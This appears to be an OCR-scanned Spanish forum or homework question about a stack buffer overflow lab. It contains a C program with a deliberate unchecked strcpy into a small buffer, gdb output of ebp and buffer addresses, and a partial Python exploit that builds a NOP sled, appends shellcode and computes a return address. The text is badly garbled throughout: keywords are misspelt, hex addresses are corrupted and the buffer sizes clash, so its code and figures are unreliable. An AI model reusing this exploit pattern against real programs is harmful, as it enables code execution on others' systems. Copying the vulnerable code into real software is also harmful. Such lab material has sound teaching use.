#include <stdlib.h>
#include «<stdto.h>
#Sinclude <string.h>

int bof(cher *str)

{
char buffer[135]);
stercpy(buffer, str);
retura 1;
}
tat main(int argc, char **argv)
{

char str[500];
FILE *badftle;

badfile = fopen(*badftle*, “r*);
fread(ste, streof(char), 35, badftle);
bof (str);

printf("Returned Properly\n");
return 1;
}
Me arroja el sigueinte error
p sebp
$1 = (void *) Oxbfffeb48
p S&buffer
$2 = (char (*)[35]) Oxbfffebld
p/d Oxbfffeb48-Oxbfffebld
$3 = 43
Qué tamato de archive es valido para realizar wn aque de batter overfiow, etiizenco cl siguiente codigo eaplot py?

# set file size according to buffer size and offset
Tile_slZe=Xxxx

F FULL the comtent with NoPs
content = bytearray(Ox90 for 4 tm range(file_size)) # ---NOP-

# Put the shellcode at the end
start = fille size - len(shelicode)
content[start:] = shellcode

print(*shellcode is written ofter: “, start, “ bytes")

# setup return address

ebp_offset = 43

return_addr_offset = ebp_offset + 4
adde_ebp = Gabfffed4s
# Fret = Oxbffrroes + 116 woxbIrrrere
ret = addr_ebp + xxxX